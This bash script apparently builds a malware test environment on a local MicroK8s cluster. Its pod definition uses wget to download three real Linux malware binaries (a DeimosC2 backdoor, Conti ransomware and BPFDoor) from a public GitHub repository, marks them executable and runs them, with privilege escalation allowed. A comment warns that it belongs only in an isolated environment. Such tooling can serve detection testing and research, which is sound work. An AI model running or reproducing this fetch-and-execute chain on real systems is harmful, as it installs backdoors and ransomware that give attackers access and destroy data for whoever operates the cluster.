#!/bin/bash
# This script interacts with the local MicroK8s cluster to deploy a test environment with malware samples.
# WARNING: This script downloads and runs real malware. Use in a secure, isolated environment ONLY.
# Function to check if MicroK8s is running
check_microk8s() {
  echo "[+] Checking MicroK8s status..."
  if ! microk8s status --wait-ready >/dev/null 2>&1; then
    echo "[-] MicroK8s is not running or not installed. Please start MicroK8s."
    exit 1
  fi
  echo "[+] MicroK8s is running."
}
# Function to create a pod that downloads and executes malware samples
create_malware_pod() {
  echo "[+] Creating a malware-test pod in MicroK8s..."
  microk8s kubectl run malware-test --image=busybox --restart=Never --overrides='{
    "apiVersion": "v1",
    "spec": {
      "containers": [
        {
          "name": "malware-container",
          "image": "busybox",
          "command": ["sh", "-c"],
          "args": [
            "wget -O /tmp/deimosC2.elf https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 && chmod +x /tmp/deimosC2.elf && /tmp/deimosC2.elf; \
             wget -O /tmp/conti.elf https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 && chmod +x /tmp/conti.elf && /tmp/conti.elf; \
             wget -O /tmp/bpfdoor.elf https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64 && chmod +x /tmp/bpfdoor.elf && /tmp/bpfdoor.elf"
          ],
          "securityContext": {
            "runAsNonRoot": true,
            "allowPrivilegeEscalation": true,
            "readOnlyRootFilesystem": false
          }
        }
      ]
    }
  }' --image-pull-policy=IfNotPresent

  if [ $? -eq 0 ]; then
    echo "[+] Malware pod successfully created."
  else
    echo "[-] Failed to create the malware pod."
    exit 1
  fi
}

# Function to monitor the malware pod
monitor_pod() {
  echo "[+] Monitoring the malware-test pod status..."
  microk8s kubectl get pods malware-test

  echo "[+] Logs of malware-test pod:"
  microk8s kubectl logs malware-test
}

# Function to clean up the malware pod
cleanup() {
  echo "[+] Cleaning up..."
  microk8s kubectl delete pod malware-test
  if [ $? -eq 0 ]; then
    echo "[+] Malware pod deleted successfully."
  else
    echo "[-] Failed to delete the malware pod."
  fi
}

# Main script execution
check_microk8s
create_malware_pod
monitor_pod
cleanup
